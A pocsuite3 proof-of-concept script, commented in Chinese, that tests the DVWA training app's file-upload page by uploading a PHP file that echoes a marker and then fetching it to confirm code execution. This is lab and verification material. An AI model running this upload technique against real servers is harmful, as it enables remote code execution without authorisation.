# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA File Upload RCE'
    vulType = VUL_TYPE.CODE_EXECUTION

    def _verify(self):
        result = {}
        path = self.url.rstrip('/') + "/index.php"
        if "upload" in self.url.lower():
            filename = "poc_test.php"
            content = "<?php echo 'vulnerable_upload_test'; ?>"
            self.set_payload(content)

            files = {'uploaded': (filename, content, 'application/x-php')}
            data = {'Upload': 'Upload'}

            try:
                # 1. 执行上传
                res = requests.post(path, files=files, data=data)

                # 2. 尝试访问上传后的文件 (DVWA 默认路径在 ../../hackable/uploads/)
                # 注意：实际路径拼接需要根据 DVWA 安装位置微调
                check_url = self.url.split('vulnerabilities')[0] + "hackable/uploads/" + filename
                res_check = requests.get(check_url)

                if "vulnerable_upload_test" in res_check.text:
                    result['VerifyInfo'] = {"URL": check_url}
            except:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerable')
        return output


register_poc(POC)